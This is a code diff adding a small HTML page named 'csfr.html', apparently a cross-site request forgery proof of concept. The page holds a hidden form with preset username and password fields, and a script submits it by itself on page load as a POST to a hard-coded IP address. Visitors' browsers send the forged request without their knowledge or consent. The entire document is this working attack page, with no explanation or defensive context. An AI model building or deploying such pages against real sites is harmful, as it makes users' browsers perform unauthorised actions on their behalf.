@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>csfr.html</title>
+</head>
+<body>
+
+<form id="form" method="POST" action="http://68.183.204.71/csfr.php">
+    <input type="hidden" name="username" value="host">
+    <input type="hidden" name="password" value="pass">
+</form>
+
+<script>
+    window.onload = function() {
+        document.getElementById("form").submit();
+    };
+</script>
+
+</body>
+</html>
